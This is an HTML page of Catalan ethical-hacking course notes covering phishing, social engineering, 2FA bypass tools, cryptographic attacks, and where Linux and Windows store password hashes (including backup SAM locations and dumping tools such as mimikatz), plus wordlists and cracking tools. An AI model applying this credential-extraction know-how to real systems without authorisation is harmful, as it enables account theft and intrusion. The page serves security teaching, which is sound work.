<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0">-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=0.5, user-scalable=yes">

  <link rel="stylesheet" href="https://cdn.hugeicons.com/font/hgi-stroke-rounded.css" />

  <title>U5 - HE a xarxes i sistemes</title>
  <link rel="stylesheet" href="estilsunitats.css">
  
</head>
<body>
  <!--<button class="theme-toggle" onclick="toggleTheme()"></button> -->
  <button class="theme-toggle" onclick="toggleTheme()">
    <i class="hgi hgi-stroke hgi-sun-01" id="theme-icon"></i>
  </button>

  <!-- boto menu hamburguesa  +  javascript -->
  <button class="hamburger" onclick="toggleMenu()" aria-label="Abrir men√∫ de navegaci√≥n">
    <span id="menu-icon">‚ò∞</span>
  </button>
  
  <div class="sidebar">
    <a href="#primer">Primer acc√©s</a>
    <a href="#cripto">Atacs Criptografics</a>
    <a href="#tcp">Atacs a TCP/IP</a>
    <a href="#metasploit">Metasploit</a>
    <a href="#ad">Atacs a Active Directory</a>    
    <a href="#expl">Accions en la m√†quina explotada</a>    
    <a href="#labs">Laboratoris</a>


  </div>

  <div style="width: 100%;">
    <header>
      <a href="index.html"><img src="imgs/HEcap.png" alt="HE" width="80%"></a>
      <!--<h2>üÖ∑üÖ∞üÖ≤üÖ∫üÖ∏üÖΩüÖ∂ √àüÜÉüÖ∏üÖ≤</h2> -->
      <h1>Unitat 5: HE a xarxes i sistemes</h1>
      <h1>.</h1>
    </header>
    
    <main>
  <section id="primer">
      <h1>Primer acc√©s</h1>
        <h2>Obtenci√≥ del primer acc√©s en un Pentest</h2>

          <p> En un <strong>pentest d‚Äôuna xarxa empresarial</strong>, el primer acc√©s  (initial access) √©s el moment en qu√® l‚Äôauditor aconsegueix
            <strong>entrar al per√≠metre de l‚Äôorganitzaci√≥</strong> amb algun tipus de  control real.           </p>

          <h3>Qu√® es considera primer acc√©s?</h3>
          <ul>
            <li>Credencials v√†lides d‚Äôun usuari corporatiu</li>
            <li>Acc√©s a una aplicaci√≥ interna o portal empresarial</li>
            <li>Execuci√≥ de comandes en un servidor o endpoint</li>
            <li>Connexi√≥ a la xarxa interna (VPN, RDP, SSH, etc.)</li>
          </ul>

          <h3>Vectors m√©s habituals</h3>
          <ol>
            <li><strong>Factor hum√†</strong>: phishing, reutilitzaci√≥ de contrasenyes</li>
            <li><strong>Aplicacions web</strong>: vulnerabilitats o errors d‚Äôautenticaci√≥</li>
            <li><strong>Infraestructura exposada</strong>: serveis mal configurats</li>
            <li><strong>Dispositius d‚Äôusuari</strong>: endpoints amb controls febles</li>
          </ol>
        
        <h2>Enginyeria Social</h2>
        <p>La <strong>enginyeria social</strong> √©s un conjunt de t√®cniques utilitzades   per manipular persones amb l‚Äôobjectiu d‚Äôobtenir informaci√≥, acc√©s o accions
          que comprometen la seguretat d‚Äôuna organitzaci√≥.  A difer√®ncia dels atacs purament t√®cnics, se centra en el  <strong>factor hum√†</strong>.  </p>

        <h3>Per qu√® funciona la enginyeria social?</h3>
        <p>Les persones prenen decisions basades en emocions, h√†bits i confian√ßa.Els atacants exploten aquestes caracter√≠stiques per evitar controls  t√®cnics i de seguretat.   </p>

        <h3>Principis psicol√≤gics fonamentals</h3>

        <ul>
          <li><strong>Autoritat</strong><br>Les persones tendeixen a obeir figures d‚Äôautoritat (directius, personal t√®cnic, responsables).        </li>

          <li><strong>Urg√®ncia</strong><br>Crear una situaci√≥ de pressa o emerg√®ncia redueix la capacitat de
            verificaci√≥ racional.          </li>

          <li><strong>Confian√ßa</strong><br>L‚Äô√∫s d‚Äôun llenguatge professional o familiar genera credibilitat
            i disminueix les sospites.</li>

          <li><strong>Por</strong><br>Amenaces de conseq√º√®ncies negatives si no s‚Äôactua immediatament.
          </li>

          <li><strong>Reciprocitat</strong><br>Quan alg√∫ ofereix ajuda o un benefici, es genera una obligaci√≥ impl√≠cita             de correspondre.</li>

          <li>             <strong>Curiositat</strong><br>Missatges atractius o misteriosos que incentiven l‚Äôacci√≥ impulsiva.           </li>
        </ul>

        <h3>T√®cniques habituals d‚Äôenginyeria social</h3>

        <ul>
          <li>Phishing (correus electr√≤nics fraudulents)</li>
          <li>Vishing (trucades telef√≤niques)</li>
          <li>Smishing (SMS o missatges instantanis)</li>
          <li>Pretexting (creaci√≥ d‚Äôun escenari fals)</li>
          <li>Baiting (oferir un incentiu o recompensa)</li>
          <li>Tailgating (acc√©s f√≠sic no autoritzat)</li>
        </ul>

      <h3>Impacte en una organitzaci√≥</h3>
        <p>           Un atac d‚Äôenginyeria social reeixit pot provocar:         </p>

        <ul>
          <li>Roba de credencials</li>
          <li>Acc√©s no autoritzat a sistemes interns</li>
          <li>P√®rdua de dades sensibles</li>
          <li>Dany reputacional</li>
          <li>Impacte econ√≤mic</li>
        </ul>

        <h2>Phishing</h2>
          <p>   El <strong>phishing</strong> √©s una t√®cnica d‚Äôenginyeria social que t√© com a
            objectiu enganyar les v√≠ctimes perqu√® revelin informaci√≥ sensible    (credencials, dades personals, informaci√≥ financera) o perqu√® executin
            accions malicioses, com clicar en enlla√ßos o descarregar arxius.       </p>

          <p>  Aquest tipus d‚Äôatac se centra principalment en el <strong>factor hum√†</strong>
            i acostuma a simular comunicacions leg√≠times d‚Äôempreses, institucions o   persones de confian√ßa.          </p>

          <h3>Com funciona el phishing</h3>
          <ol>
            <li>L‚Äôatacant crea un missatge que sembla leg√≠tim</li>
            <li>La v√≠ctima rep el missatge (correu, SMS, trucada, etc.)</li>
            <li>Es genera una situaci√≥ d‚Äôurg√®ncia o confian√ßa</li>
            <li>La v√≠ctima realitza l‚Äôacci√≥ sol¬∑licitada</li>
            <li>L‚Äôatacant obt√© acc√©s o informaci√≥ sensible</li>
          </ol>

          <h3>Tipus principals de phishing</h3>

          <ul>
            <li>  <strong>Email Phishing</strong><br>  El m√©s com√∫. Correus electr√≤nics massius que suplanten bancs, serveis 
              online o departaments interns d‚Äôuna empresa.       </li>
            <li>  <strong>Spear Phishing</strong><br>   Atacs dirigits a una persona o grup concret, amb informaci√≥ personalitzada           per augmentar la credibilitat.  </li>
            <li>  <strong>Whaling</strong><br>   Variant del spear phishing orientada a alts c√†rrecs    (directius, ger√®ncia, CFO, CEO).   </li>
            <li>  <strong>Smishing</strong><br>   Phishing mitjan√ßant missatges SMS o aplicacions de missatgeria instant√†nia.             </li>
            <li>  <strong>Vishing</strong><br>   Atacs realitzats a trav√©s de trucades telef√≤niques, sovint simulant
              serveis t√®cnics o entitats oficials.  </li>
            <li>  <strong>Clone Phishing</strong><br>  Es copia un correu leg√≠tim pr√®viament rebut i se‚Äôn modifica el contingut
              per introduir un enlla√ß o arxiu malici√≥s.   </li>
            <li>  <strong>Business Email Compromise (BEC)</strong><br> Comprom√≠s de comptes corporatius per ordenar pagaments fraudulents o
              sol¬∑licitar informaci√≥ confidencial.   </li>
          </ul>

          <h3>Impacte del phishing en una organitzaci√≥</h3>
          <ul>
            <li>Roba de credencials corporatives</li>
            <li>Acc√©s no autoritzat a sistemes interns</li>
            <li>P√®rdues econ√≤miques</li>
            <li>Fuites de dades sensibles</li>
            <li>Dany reputacional</li>
          </ul>

          <h3>Com protegir-se del phishing</h3>
          <ul>
            <li>Formaci√≥ i conscienciaci√≥ del personal</li>
            <li>Verificar sempre l‚Äôorigen dels missatges</li>
            <li>No clicar en enlla√ßos sospitosos</li>
            <li>√ös d‚Äôautenticaci√≥ multifactor (MFA)</li>
            <li>Filtres antispam i controls de correu</li>
          </ul>
        <h3>Atacs relacionats amb fitxers adjunts mailiciosos</h3>
        <p>Els correus alectronics poden contindre arxius adjunts, que si es decarreguen , obrin, o s'executen (depenent de la vulnerabilitat 
          que exploten), seran una porta d'entrada a la xarxa objectiu</p>
        <ul> Alguns atacs/vulns destacables
          <li>Vuln. Follina (CVE-2022-30190). zero click. Afecta a fitxers d'office MS</li>
          <li>CVE-2021-40444. Fitxers MS Word</li>
          <li>Zip-Slip</li>
          <li>Zip-Symlink</li>
          <li>CVE-2023-23397 (zero click) Outlook</li>
          <li>Atacs a M. Exchange (ProxyLogon, ProxyOracle, ProxyShell)</li>
        </ul>

       <h2>Eines de phishing    </h2>
          <p>  En l‚Äô√†mbit de la <strong>ciberseguretat</strong>, les eines de phishing  s‚Äôutilitzen principalment en <strong>pentests autoritzats</strong>,
            auditories de seguretat i campanyes de <strong>conscienciaci√≥</strong>   per avaluar la resist√®ncia de les organitzacions davant atacs
            basats en enginyeria social.   </p>

          <p> L‚Äôobjectiu no √©s comprometre usuaris, sin√≥  <strong>identificar debilitats humanes i de proc√©s</strong>
            per millorar la seguretat global.  </p>

          <h3>Per qu√® s‚Äôutilitzen en pentesting?</h3>
          <ul>
            <li>Avaluar el nivell de conscienciaci√≥ dels empleats</li>
            <li>Mesurar la capacitat de detecci√≥ d‚Äôatacs</li>
            <li>Validar procediments interns de resposta</li>
            <li>Reduir riscos abans d‚Äôun atac real</li>
          </ul>

        <hr><h3>SET (Social-Engineer Toolkit)</h3>
        <p>  <strong>SET (Social-Engineer Toolkit)</strong> √©s una eina de codi obert  dissenyada per a <strong>auditories de seguretat i proves d‚Äôenginyeria social
          autoritzades</strong>. El seu objectiu principal √©s avaluar el  <strong>factor hum√†</strong> dins d‚Äôuna organitzaci√≥, un dels vectors
          d‚Äôatac m√©s explotats en incidents reals de seguretat.  </p>

        <h3>Objectiu principal de SET</h3>
        <p>  SET permet simular atacs d‚Äôenginyeria social per comprovar si els empleats, procediments i controls de seguretat s√≥n capa√ßos de detectar
          i resistir intents de manipulaci√≥.  </p>

        <h3>Relaci√≥ amb el phishing</h3>
        <p>   Una de les funcionalitats m√©s conegudes de SET √©s la  <strong>simulaci√≥ de campanyes de phishing</strong>, utilitzades en
          pentests amb autoritzaci√≥ contractual per:   </p>

        <ul>
          <li>Avaluar la conscienciaci√≥ dels usuaris</li>
          <li>Detectar debilitats en processos interns</li>
          <li>Mesurar el temps de resposta davant incidents</li>
          <li>Comprovar controls de seguretat existents</li>
        </ul>

        <h3>Tipus de simulacions que permet SET</h3>
        <ul>
          <li>Enginyeria social basada en correu electr√≤nic</li>
          <li>Portals web falsos per a proves de credencials</li>
          <li>Escenaris de manipulaci√≥ psicol√≤gica</li>
          <li>Proves de confian√ßa i autoritat simulada</li>
        </ul>
        <h4>Altres eines habituals s√≥n: MaxPhisher i  Gophish</h4>

      <h2>Evitar la protecci√≥ de doble factor 2FA</h2>
        <p>Una vegada s'obtenen credencials d'un usuari, es procedir√† a provarles en diferents serveis, VPN, mail, access a sistema operatiu, acc√©s a aplicacions ..
          Este atac de reutilitzaci√≥ de credencials s'anomena   <strong>password spraying</strong> </p>
          <p>   El <strong>Doble Factor d‚ÄôAutenticaci√≥ (2FA)</strong> √©s una de les mesures     de seguretat m√©s eficaces per protegir comptes i sistemes. 
          Tot i aix√≤, <strong>no √©s infal¬∑lible</strong> si s‚Äôimplementa o s‚Äôutilitza     incorrectament.   </p>
          <p>Si el pentester es troba amb un 2FA, pot intentar botar-lo amb eines com  <strong>evilginx2 o modlishka</strong></p>
          <p>Tamb√© es pot practicar com botar-se esta protecci√≥ en diversos laboratoris de la academia de <strong>PortSwigger</strong></p>

      <h2>T√®cniques de Red Team</h2>
        <p> En un <strong>exercici de red team autoritzat</strong>, les t√®cniques d‚Äôatac     no es limiten a l‚Äô√†mbit digital. Molts atacs reals combinen
          <strong>factors f√≠sics, humans i tecnol√≤gics</strong>.
          L‚Äôobjectiu no √©s ‚Äútrencar sistemes‚Äù, sin√≥     <strong>avaluar la seguretat real d‚Äôuna organitzaci√≥</strong>.   </p>

        <h3>Red Team vs Pentesting tradicional</h3>
        <p>
          A difer√®ncia d‚Äôun pentest cl√†ssic, el red team:
        </p>
        <ul>
          <li>Simula atacants reals</li>
          <li>Combina m√∫ltiples vectors</li>
          <li>Avalua detecci√≥ i resposta</li>
          <li>Inclou seguretat f√≠sica i humana</li>
        </ul>

        <h3>1. Lock Picking (Seguretat f√≠sica)</h3>
        <p>
          El <strong>lock picking</strong> representa l‚Äôavaluaci√≥ de
          <strong>controls d‚Äôacc√©s f√≠sics</strong>.
          No se centra en for√ßar portes, sin√≥ en comprovar si
          els mecanismes f√≠sics ofereixen una protecci√≥ real.
        </p>

        <strong>Qu√® avalua?</strong>
        <ul>
          <li>Qualitat dels panys</li>
          <li>Depend√®ncia excessiva del control f√≠sic</li>
          <li>Abs√®ncia de capes addicionals de seguretat</li>
        </ul>

        <strong>Riscos associats:</strong>
        <ul>
          <li>Acc√©s f√≠sic no autoritzat</li>
          <li>Connexi√≥ directa a la xarxa interna</li>
          <li>Manipulaci√≥ de dispositius</li>
        </ul>

        <strong>Mesures defensives:</strong>
        <ul>
          <li>Panys certificats i de qualitat</li>
          <li>Controls d‚Äôacc√©s electr√≤nics</li>
          <li>C√†meres i monitoratge</li>
          <li>Seguretat per capes</li>
        </ul>

        <h3>2. Rubber Ducky / BadUSB</h3>
        <p>  Els dispositius <strong>Rubber Ducky</strong> o     <strong>BadUSB</strong> simulen ser perif√®rics leg√≠tims
        (com teclats o adaptadors), per√≤ representen  <strong>un risc quan els dispositius USB s√≥n confiats autom√†ticament</strong>. </p>
        <p>Hi ha altres dispositius com Flipper Zero, KeyCroc, Evil Crow RF, etc. <br> 
        Este tipus d'atac va ser emprat per primera vegada amb el virus <strong>Stuxnet</strong> </p>

        <strong>Mesures defensives:</strong>
        <ul>
          <li>Desactivar USB no necessaris</li>
          <li>Control de dispositius (Device Control)</li>
          <li>EDR i protecci√≥ d‚Äôendpoint</li>
          <li>Formaci√≥ dels usuaris</li>
        </ul>

        <h3>Factor hum√†: el denominador com√∫</h3>
        <p>
          Tant el lock picking com el BadUSB demostren que
          <strong>el factor hum√† √©s clau</strong>:
        </p>
        <ul>
          <li>Confian√ßa excessiva</li>
          <li>Manca de consci√®ncia de seguretat</li>
          <li>Rutines previsibles</li>
        </ul>

      </section>         

    <section id="cripto">
    <h1>Atacs criptografics</h1>
   
    <p> Els <strong>atacs criptogr√†fics</strong> s√≥n t√®cniques utilitzades per comprometre la confidencialitat, integritat o autenticitat de la
      informaci√≥ protegida mitjan√ßant mecanismes criptogr√†fics. Sovint no ataquen l‚Äôalgoritme en si, sin√≥
      <strong>errors d‚Äôimplementaci√≥, configuraci√≥ o √∫s</strong>.     </p>

    <h3>Per qu√® s√≥n cr√≠tics?</h3>
    <p>       La criptografia √©s la base de la seguretat moderna: comunicacions xifrades,  autenticaci√≥, signatures digitals i protecci√≥ de dades.
      Quan falla, l‚Äôimpacte pot ser total.     </p>
      <p>Segons la guia CCN-STIC 807, els errors m√©s comuns</p>
      <ol>
        <li>Crear el nostre propi algorisme criptografic</li>
        <li>Implementar un algorisme existent</li>
        <li>Mal √∫s de llibreries i algorismes existents</li>
        <li>Predictibilitat (oracle attacks)</li>
        <li>Evitaci√≥ de la criptografia (canal lateral)</li>
        <li>Criptografia no aillada</li>
      </ol>

    <h3>Principals categories d‚Äôatacs criptogr√†fics</h3>

    <h4>1. Atacs contra xifratge feble o obsolet</h4>
    <ul>
      <li>√ös d‚Äôalgoritmes antics o insegurs</li>
      <li>Claus massa curtes</li>
      <li>Xifratge sim√®tric o asim√®tric mal seleccionat</li>
    </ul>

    <h4>2. Atacs contra la gesti√≥ de claus</h4>
    <ul>
      <li>Claus emmagatzemades en text pla</li>
      <li>Reutilitzaci√≥ de claus</li>
      <li>Distribuci√≥ insegura de claus</li>
      <li>Rotaci√≥ inexistent o incorrecta</li>
    </ul>

    <h4>3. Atacs contra funcions hash</h4>
    <ul>
      <li>Col¬∑lisions (dos valors amb el mateix hash)</li>
      <li>Hashes sense salt</li>
      <li>Algoritmes hash trencats o obsolets</li>
    </ul>

    <h4>4. Atacs de canal lateral (Side-Channel)</h4>
    <ul>
      <li>An√†lisi de temps d‚Äôexecuci√≥</li>
      <li>Consum d‚Äôenergia</li>
      <li>Errors o missatges retornats</li>
    </ul>

    <h4>5. Atacs a protocols criptogr√†fics</h4>
    <ul>
      <li>Configuracions TLS incorrectes</li>
      <li>Protocols antics habilitats</li>
      <li>Negociaci√≥ insegura de xifratge</li>
    </ul>

    <ul> Recursos per ampliar coneixements sobre criptografia
      <li>Class4crypt (Canal de youtube)</li>
      <li>criptografiayseguridad.blogspot.com</li>
      <li>Criptored (Projecte)</li>
     I en diferents plataformes de reptes com Atenea, Academia Hacker, PicoCTF, etc..
      <li>Proyecto CLCript</li>
      <li>Blog de Mikel Garcia Larragan</li>
      <li>cryptopals.com - challenges</li>
      <li>Ferramenta <strong>criptovenom</strong></li>
    </ul>

    <h2>Password hashing</h2>
      <p>
        El <strong>password hashing</strong> √©s un mecanisme de seguretat utilitzat per protegir les contrasenyes dels usuaris. En lloc de desar la contrasenya        en text pla, el sistema emmagatzema una <strong>empremta criptogr√†fica
        (hash)</strong> generada a partir d‚Äôaquesta.      </p>

      <h3>Per qu√® no s‚Äôhan d‚Äôemmagatzemar contrasenyes en text pla?</h3>
      <p>  Si una base de dades √©s compromesa i les contrasenyes estan en text pla,        totes les credencials queden exposades immediatament. El password hashing        redueix dr√†sticament l‚Äôimpacte d‚Äôaquest tipus d‚Äôincidents.      </p>

      <h3>Qu√® √©s un hash?</h3>
      <p>
        Un <strong>hash</strong> √©s el resultat d‚Äôuna funci√≥ matem√†tica que:
      </p>
      <ul>
        <li>Converteix dades d‚Äôentrada en una sortida de longitud fixa</li>
        <li>No es pot revertir (funci√≥ unidireccional)</li>
        <li>Canvia completament amb una m√≠nima variaci√≥ de l‚Äôentrada</li>
      </ul>

      <h3>Proc√©s b√†sic de password hashing</h3>
      <ol>
        <li>L‚Äôusuari introdueix una contrasenya</li>
        <li>El sistema aplica una funci√≥ hash segura</li>
        <li>El resultat s‚Äôemmagatzema a la base de dades</li>
        <li>En el login, es calcula el hash de la contrasenya introdu√Øda</li>
        <li>Es comparen els hashes, no les contrasenyes</li>
      </ol>

      <h3>El concepte de salt</h3>
      <p> Un <strong>salt</strong> √©s un valor aleatori afegit a la contrasenya abans  de calcular el hash. El seu objectiu √©s evitar:       </p>
      <ul>
        <li>Atacs amb taules rainbow</li>
        <li>Que dues contrasenyes iguals tinguin el mateix hash</li>
      </ul>
      <p> Un <strong>pepper</strong> √©s similar al salt per√≤ no s'emmagatzema junt al hash   </p>
      <p>  ** Afegir un nombre gran d'iteracions per generar la clau, fa m√©s robust el hash</p>
      <p> ** Afegir requeriments de mem√≤ria grans, augmenta el cost computacinal de for√ßa bruta</p>

      <h3>Algorismes recomanats per a contrasenyes</h3>
      <ul>
        <li><strong>bcrypt</strong></li>
        <li><strong>Argon2</strong> (recomanat actualment)</li>
        <li><strong>scrypt</strong></li>
        <li><strong>PBKDF2</strong></li>
      </ul>

      <h3>Algorismes NO recomanats</h3>
      <ul>
        <li>MD5</li>
        <li>SHA-1</li>
        <li>SHA-256 (sense iteracions ni salt)</li>
      </ul>

    <h2>Emmagatzemament de passwords(hash) en SO</h2>
     <h3>Linux      </h3>
      <p>  En sistemes <strong>Linux</strong>, les contrasenyes dels usuaris    <strong>no s‚Äôemmagatzemen en text pla</strong>. En el seu lloc, el sistema
    guarda un <strong>hash criptogr√†fic</strong> de la contrasenya, la qual cosa     permet verificar-la sense revelar el seu valor original.   </p>
   <h4>On s‚Äôemmagatzemen els hashos en Linux?</h4>
  <h5>/etc/passwd</h5>
  <p>    Antigament contenia les contrasenyes, per√≤ actualment nom√©s guarda    informaci√≥ b√†sica de l‚Äôusuari. El camp de contrasenya sol contenir una    <code>x</code> indicant que el hash real est√† en un altre fitxer.  </p>

  <h4>/etc/shadow</h4>
  <p>    El fitxer <strong>/etc/shadow</strong> cont√© els hashos reals de les    contrasenyes i nom√©s √©s accessible per l‚Äôusuari <strong>root</strong>.  </p>

  <p>Cada entrada inclou:  </p>
  <ul>
    <li>Nom d‚Äôusuari</li>
    <li>Hash de la contrasenya</li>
    <li>Informaci√≥ de caducitat</li>
    <li>Pol√≠tiques de canvi</li>
  </ul>
  <pre>Exemple
diego:$6$PmLE1Jrk9oLnacKL$aSRMmaxrkCMvxfK2I9Y80:18118:0:99999:7:::
username: diego
contrasenya: $6$PmLE1Jrk9oLnacKL$aSRMmaxrkCMvxfK2I9Y80
Data de l√∫ltim canvi : 18124 (*)
Edad m√≠nima de la password: 0
Edad m√°xima de la password: 99999
Per√≠ode d'avis de caducitat: 7 d√≠as.
Els tres √∫ltims tres camps no tenen dades. 
  (Dies de gr√†cia despr√©s de caducar, Data de bloqueig del compte, Reservat)    
  </pre>
  <pre>$6$PmLE1Jrk9oLnacKL$aSRMmaxrkCMvxfK2I9Y80
$6$ ‚Üí Algoritme de hash
PmLE1Jrk9oLnacKL ‚Üí Salt  (Valor aleatori per evitar rainbow tables.)
aSRMmaxrkCMvxfK2I9Y80 ‚Üí Resultat del hash (√âs el resultat criptogr√†fic final del hash)
  </pre>

  <pre>
Codi        Algorisme        Estat de seguretat   Notes
$1$         MD5               ‚ùå Obsolet         Trencable r√†pidament
$2a$        Blowfish          ‚ö†Ô∏è Antic           Poc habitual avui
$2y$        Blowfish (bcrypt) ‚úÖ Segur           Usat en alguns sistemes
$5$         SHA-256           ‚ö†Ô∏è Acceptable      Millor que MD5
$6$         SHA-512           ‚úÖ Segur           Molt com√∫ en Linux
$y$         yescrypt          ‚úÖ Molt segur      Recomanat actualment
$7$         scrypt            ‚úÖ Molt segur      Resistent a GPU
$argon2i$   Argon2i           ‚úÖ Molt segur      Mem√≤ria-intensiu
$argon2id$  Argon2id          ‚úÖ Molt segur      Est√†ndard modern</pre>

     <h3>Windows</h3>
      <h4>On emmagatzema Windows els hashes?</h4>
        <p>
          Windows utilitza principalment dos components:
        </p>

        <ul>
          <li><strong>SAM (Security Account Manager)</strong><br> Cont√© els hashes de les contrasenyes dels comptes locals.
          </li>
          <li><strong>Active Directory (NTDS.dit)</strong><br>En entorns de domini, emmagatzema els hashes dels usuaris del domini.
          </li>
        </ul>

        <h4>Tipus de hashes utilitzats a Windows</h4>

        <ul>
          <li><strong>LM (LAN Manager)</strong><br>Antic i insegur. Avui dia est√† deshabilitat per defecte.
          </li>
          <li><strong>NTLM</strong><br>M√©s robust que LM, per√≤ considerat obsolet davant atacs moderns.
          </li>
          <li><strong>NTLMv2</strong><br>Versi√≥ millorada utilitzada en protocols d‚Äôautenticaci√≥ de xarxa.
          </li>
        </ul>
        <p>üìç Ubicaci√≥ de la SAM  (Fitxer principal)</p>
        <pre>C:\Windows\System32\config\SAM</pre>
        <ul>Aquest fitxer:
          <li>Cont√© els hashes dels comptes locals</li>
          <li>Est√† bloquejat pel sistema quan Windows est√† en execuci√≥</li>
          <li>Nom√©s √©s accessible amb privilegis elevats i en determinades condicions</li>
        </ul>
        <p>üîê Fitxers relacionats (molt importants)</p>
        <p>La SAM no funciona sola. Necessita altres fitxers del mateix directori:</p>
<pre>C:\Windows\System32\config\
‚îú‚îÄ SAM      ‚Üí comptes locals
‚îú‚îÄ SYSTEM   ‚Üí clau per desencriptar la SAM
‚îú‚îÄ SECURITY ‚Üí pol√≠tiques locals
</pre>
      <p>‚ö†Ô∏è No es pot llegir en calent !!</p>
      <p>Peeeero, Si hi ha imatges de recuperaci√≥ creades, SAM i SYSTEM tamb√© poden estar en <code>C:\windows\repair</code> o en 
        <code>C:\windows\System32\config\RegBack</code>     </p>
     <p>A m√©s a m√©s, hi ha eines espec√≠fiques per obtindre els hash, com , <strong>pwdump7</strong> v.ant a W10
    , o <strong>pwdump8</strong> m√©s actualitzat, <strong>samdump2</strong> de kali, o <strong>mimikatz</strong>
  que permet extraure contrasenyes de mem√≤ria, o fer atacs de <code>pass-the-hash</code> o <code>pass-the-ticket</code>
 o <code>Golden tickets</code>, etc..</p>

    <hr><h2>Us i creaci√≥ de diccionaris</h2>
     <p>En cas d'obtindre hashes en el test d'intrussi√≥, es disposa de tres formes de descobrir les contrasenyes que han generat eixos hashes  </p>
    <ol>
      <li>Atacs de for√ßa bruta</li>
      <li>Atacs mitjant√ßant <code>rainbow tables</code></li>
      <li>Atacs mitjant√ßant diccionari</li>
    </ol>

      <h3>Qu√® √©s un diccionari en seguretat?</h3>
    <p>Un diccionari √©s una llista estructurada que pot contenir:   </p>
    <ul>
      <li>Contrasenyes habituals</li>
      <li>Paraules comunes</li>
      <li>Combinacions previsibles</li>
      <li>Variants amb n√∫meros o s√≠mbols</li>
      <li>Patrons basats en el context de l‚Äôobjectiu</li>
    </ul>

  <h3>Diccionaris gen√®rics vs diccionaris personalitzats</h3>

  <h4>Diccionaris gen√®rics</h4>
  <ul>
    <li>Contenen contrasenyes comunes</li>
    <li>S√≥n f√†cils d‚Äôobtenir</li>
    <li>Serveixen com a primera prova</li>
  </ul>

     <p> Les <strong>llistes de contrasenyes</strong> s√≥n col¬∑leccions de passwords
    utilitzades en auditories de seguretat per avaluar la    <strong>robustesa de les pol√≠tiques d‚Äôautenticaci√≥</strong>.
    En un context professional, s‚Äôutilitzen √∫nicament    <strong>amb autoritzaci√≥ i dins l‚Äôabast definit</strong>.  </p>
  <p>√âs un conjunt de contrasenyes recopilades a partir de patrons comuns    d‚Äô√∫s hum√†, filtracions p√∫bliques o an√†lisi estad√≠stica.
     Aquestes llistes reflecteixen <strong>com creen contrasenyes les persones    en la pr√†ctica real</strong>.  </p>


  <p>En kali, per defecte hi ha instalat alguns en el directori <code>/usr/share/wordlists</code> i es poden 
  instalar m√©s, com per exemple la lista <strong>Seclist</strong> amb <code>apt install seclists</code> situant 
els fitxers nous en <code>/usr/share/seclists</code></p>
<p>La llista m√©s famosa de totes es la llista <code>Rockyou</code></p>
<p>Hi ha un projecte anomenat <strong>Kaonashi</strong> que es pot descarregar de github <code>github.com/kaonashi/kaonashi-passwords/Kaonashi</code></p>
 <p>Altre element important s√≥n les <strong>contrasenyes predeterminades</strong> que posen els fabricants en alguns porductes i 
que despr√©s no es canvien quan es posen en producci√≥. </p>

   <h4>Diccionaris personalitzats</h4>
  <ul>
    <li>Es basen en informaci√≥ de l‚Äôorganitzaci√≥</li>
    <li>Inclouen noms, marques, ubicacions, anys</li>
    <li>S√≥n molt m√©s efectius en entorns reals</li>
  </ul>  

 <h4>Fonts habituals per a diccionaris personalitzats</h4>
  <ul>
    <li>P√†gina web corporativa</li>
    <li>Xarxes socials i perfils p√∫blics</li>
    <li>Documents interns (quan est√† perm√®s)</li>
    <li>Convencions internes de noms</li>
    <li>Errors humans previsibles</li>
  </ul>

  <h4>Eines per crear diccionaris personalitzats </h4>
  <ul>
    <li>cewl</li>
    <li>crunch</li>
  </ul>
    <h3>cewl</h3>
    <p>cewl es una eina que genera diccionaris a partir del contingut d'un lloc web</p>

    <hr><h3>Password cracking</h3>
      <p>    El <strong>password cracking</strong> √©s el proc√©s mitjan√ßant el qual es prova    de recuperar una contrasenya a partir 
        del seu <strong>hash</strong>, amb l‚Äôobjectiu d‚Äô<strong>avaluar la robustesa    de les pol√≠tiques de seguretat</strong> en auditories autoritzades.  </p>
  <ul>En un <strong>pentest professional</strong>, el password cracking no busca ‚Äútrencar per trencar‚Äù, sin√≥:
    <li>Mesurar la fortalesa real de les contrasenyes</li>
    <li>Detectar riscos associats al factor hum√†</li>
    <li>Validar pol√≠tiques de seguretat existents</li>
    <li>Justificar millores com MFA o canvis de pol√≠tica</li>
  </ul>
   <h3>Visi√≥ general del proc√©s</h3>
   <ol>
    <li>      <strong>Obtenci√≥ del material d‚Äôautenticaci√≥</strong><br>      Es treballa amb <em>hashes</em> o respostes d‚Äôautenticaci√≥, mai amb      contrasenyes en text clar.    </li>
    <li>      <strong>Identificaci√≥ del tipus de hash</strong><br>      Con√®ixer l‚Äôalgoritme utilitzat (per exemple, si incorpora sal, iteracions,      etc.) √©s clau per entendre la resist√®ncia del sistema.    </li>
    <li>      <strong>Selecci√≥ d‚Äôestrat√®gia</strong><br>      Es tria un enfocament realista basat en patrons humans i context      (no for√ßa bruta indiscriminada).    </li>
    <li>      <strong>Prova controlada</strong><br>      Les proves es fan de manera limitada i documentada, respectant      l‚Äôabast i evitant impactes operatius.    </li>
    <li>      <strong>An√†lisi de resultats</strong><br>      S‚Äôavalua qu√® s‚Äôha pogut recuperar i per qu√®, identificant debilitats.    </li>
  </ol>

<h2>Comparaci√≥ d‚ÄôEines: John the Ripper vs Hashcat</h2>

  <p>
    <strong>John the Ripper</strong> i <strong>Hashcat</strong> s√≥n dues eines
    √†mpliament utilitzades en <strong>auditories de seguretat i pentesting
    autoritzat</strong> per avaluar la fortalesa de les contrasenyes.
    Tot i que comparteixen objectiu, el seu enfocament i caracter√≠stiques
    s√≥n diferents.
  </p>

  <h3>Visi√≥ general</h3>

  <table border="1" cellpadding="8" cellspacing="0" width="100%">
    <thead style="background:#f2f2f2;">
      <tr>
        <th>Caracter√≠stica</th>
        <th>John the Ripper</th>
        <th>Hashcat</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Enfocament principal</td>
        <td>Flexibilitat i facilitat d‚Äô√∫s</td>
        <td>Rendiment i velocitat</td>
      </tr>
      <tr>
        <td>√ös de GPU</td>
        <td>Limitat / opcional</td>
        <td>Central (GPU-first)</td>
      </tr>
      <tr>
        <td>Facilitat per a principiants</td>
        <td>Alta</td>
        <td>Mitjana</td>
      </tr>
      <tr>
        <td>Rendiment en grans volums</td>
        <td>Moderat</td>
        <td>Molt alt</td>
      </tr>
      <tr>
        <td>Formats de hash</td>
        <td>Molt ampli</td>
        <td>Molt ampli</td>
      </tr>
      <tr>
        <td>Configuraci√≥ inicial</td>
        <td>Senzilla</td>
        <td>M√©s complexa</td>
      </tr>
    </tbody>
  </table>

  <h3>John the Ripper</h3>
